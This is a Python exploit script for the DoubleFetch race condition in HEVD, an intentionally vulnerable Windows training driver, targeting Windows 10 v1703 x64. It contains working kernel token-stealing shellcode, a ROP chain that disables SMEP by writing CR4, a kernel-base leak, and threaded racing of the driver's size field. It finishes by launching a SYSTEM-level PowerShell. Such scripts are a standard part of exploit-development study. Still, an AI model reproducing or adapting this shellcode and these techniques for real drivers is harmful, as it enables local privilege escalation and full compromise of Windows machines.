#!/usr/bin/python
#
# HEVD v1.20 DoubleFetch exploit for Windows 10 v1703 x64 by @acru3l.
#

import sys
import struct
import time
import threading
from ctypes import *
from ctypes.wintypes import *

ioctl_DoubleFetch = 0x222037

device_name = r'\\.\HackSysExtremeVulnerableDriver'
hFile = None

def pusha():
    '''
    alernative to pusha on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x50'                                      # push rax
    code += '\x53'                                      # push rbx
    code += '\x51'                                      # push rcx
    
    return code

def popa():
    '''
    alternative to popa on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x59'                                      # pop rcx
    code += '\x5b'                                      # pop rbx
    code += '\x58'                                      # pop rax
    
    return code

def shellcode():
    '''
    token stealing shellcode
    '''
    # assembled with metasm
    # steal token
    code = ''
    code += pusha()
    code += '\x65\x48\x8b\x04\x25\x88\x01\x00\x00'      # mov rax,[gs:0x188]        ; 0x188 = offset nt!_KPCR.PcrbData.CurrentThread
    code += '\x48\x8b\x80\xb8\x00\x00\x00'              # mov rax,[rax+0xb8]        ; 0xB8  = offset nt!_KTHREAD.ApcState.Process
    code += '\x48\x89\xc3'                              # mov rbx,rax
    code += '\x48\x8b\x9b\xe8\x02\x00\x00'              # mov rbx,[rbx+0x2e8]       ; 0x2E8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
    code += '\x48\x81\xeb\xe8\x02\x00\x00'              # sub rbx,0x2e8
    code += '\x48\x8b\x8b\xe0\x02\x00\x00'              # mov rcx,[rbx+0x2e0]       ; 0x2E0 = offset nt!_EPROCESS.UniqueProcessId
    code += '\x48\x83\xf9\x04'                          # cmp rcx,4
    code += '\x75\xe5'                                  # jnz $-0x19
    code += '\x48\x8b\x8b\x58\x03\x00\x00'              # mov rcx,[rbx+0x358]       ; 0x358 = offset nt!_EPROCESS.Token
    code += '\x48\x89\x88\x58\x03\x00\x00'              # mov [rax+0x358],rcx
    code += popa()
    # recover regs
    code += '\x48\x83\xc4\x10'                          # add rsp,0x10
    code += '\x48\x8b\x5c\x24\x28'                      # mov rbx,[rsp+0x28]
    code += '\x48\x8b\x83\xb8\x00\x00\x00'              # mov rax,[rbx+0xB8]
    code += '\x48\x8b\x40\x20'                          # mov rax,[rax+0x20]
    code += '\x49\xba\xef\xbe\xfe\xca\xce\xfa\xed\xfe'  # mov r10,0xfeedfacecafebeef ; mark as exploited
    code += '\x4c\x89\x10'                              # mov [rax],r10
    code += '\xc3'                                      # ret -> returns to HEVD!IrpDeviceIoCtlHandler+0x1d3
    
    return code

def alloc_buffer(data):
    '''
    alloc buffer and copy data
    '''
    windll.kernel32.VirtualAlloc.argtypes = [LPVOID, c_size_t, DWORD, DWORD]
    windll.kernel32.VirtualAlloc.restype = LPVOID
    
    buffer = windll.kernel32.VirtualAlloc(
        0,
        len(data),
        0x00003000,                                     # MEM_COMMIT | MEM_RESERVE
        0x40)                                           # PAGE_EXECUTE_READWRITE
    
    memmove(buffer, data, len(data))
    
    return buffer

def build_ropchain(kernel_base, shellcode_addr):
    '''
    trampoline to shellcode
    '''
    chain = ''
    chain += struct.pack('<Q', kernel_base + 0x597b)    # pop rcx; ret;
    chain += struct.pack('<Q', 0x506f8)                 # rcx
    chain += struct.pack('<Q', kernel_base + 0x108552)  # mov cr4, rcx; ret;
    chain += struct.pack('<Q', shellcode_addr)
    
    return chain

def open_device():
    '''
    (re)open vulnerable device
    '''
    global hFile
    
    if hFile > 0:
        windll.kernel32.CloseHandle(hFile)
    
    hFile = windll.kernel32.CreateFileA(
        device_name,
        0xC0000000,                                     # GENERIC_READ | GENERIC_WRITE
        0x00000001,                                     # FILE_SHARE_READ
        0,                                              # NULL
        3,                                              # OPEN_EXISTING
        0x80,                                           # FILE_ATTRIBUTE_NORMAL
        0)                                              # NULL
    
    if hFile == -1:
        print '[-] Failed to open device: %s' % device_name
        return False
    else:
        print '[+] Device opened successfully: %s' % device_name
        return True

def call_DoubleFetch(object):
    '''
    DeviceIoControl wrapper
    '''
    #open_device()
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, POINTER(DWORD), LPVOID]
    windll.kernel32.DeviceIoControl.restype = BOOL
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_DoubleFetch,
        object,
        0x10,
        0,
        0,
        byref(bytes_retn),
        0)

def get_kernel_base():
    '''
    find base address of the kernel via EnumDeviceDrivers
    '''
    array = c_ulonglong * 0x400
    addr = array()
    
    windll.psapi.EnumDeviceDrivers.argtypes = [POINTER(LPVOID), DWORD, POINTER(DWORD)]
    windll.psapi.EnumDeviceDrivers.restype = BOOL
    
    res = windll.psapi.EnumDeviceDrivers(
            cast(byref(addr), POINTER(LPVOID)),
            sizeof(addr),
            byref(c_ulong(0)))
    if not res:
        return None
    
    # Kernel is the first entry of the result
    return addr[0]

def worker(addr, value, evt):
    '''
    *(addr) = value until evt is set
    '''
    print '[+] Thread started: worker(0x%016x, 0x%016x, ...)' % (addr, value)
    
    while not evt.is_set():
        # better off using an atomic operation, but it works anyway
        memmove(addr, struct.pack('<Q', value), 8)
    
    print '[+] Thread stopped: worker(0x%016x, 0x%016x, ...)' % (addr, value)
    
    return

def break_code():
    import time
    time.sleep(0.5)
    windll.kernel32.DebugBreak()

if __name__ == '__main__':
    if not open_device():
        sys.exit(1)
    
    base_addr = get_kernel_base()
    if not base_addr:
        print '[-] Failed to obtain Kernel base'
        sys.exit(1)
    print '[+] Kernel base address: 0x%016x' % base_addr
    
    shellcode_addr = alloc_buffer(shellcode())
    if not shellcode_addr:
        print '[-] Failed to allocate shellcode'
        sys.exit(1)
    print '[+] Shellcode allocated at 0x%016x' % shellcode_addr
    
    ropchain = build_ropchain(base_addr, shellcode_addr)
    payload = 'A' * 0x808 + \
              ropchain                                  # smashing saved rip
    payload_buffer = alloc_buffer(payload)
    
    object = struct.pack('<Q', payload_buffer) + \
             struct.pack('<Q', len(payload))            # DOUBLE_FETCH.Size
    object_buffer = create_string_buffer(object)
    
    print '[+] Starting workers...'
    
    # workers that modify DOUBLE_FETCH.Size
    e1 = threading.Event()
    e2 = threading.Event()
    t1 = threading.Thread(target=worker, args=(addressof(object_buffer) + 8, 0x800, e1))
    t2 = threading.Thread(target=worker, args=(addressof(object_buffer) + 8, len(payload), e2))
    t1.start()
    time.sleep(0.1)
    t2.start()
    time.sleep(0.1)
    
    print '[+] Start racing with workers'
    
    while True:
        call_DoubleFetch(addressof(object_buffer))
        
        # exploit succeeded?
        if object_buffer.raw[:8] == struct.pack('<Q', 0xfeedfacecafebeef):
            print '[+] Stopping workers...'
            
            e1.set()
            time.sleep(0.1)
            e2.set()
            time.sleep(0.1)
            
            # Got SYSTEM shell?
            import os
            os.system("powershell.exe")
            
            break
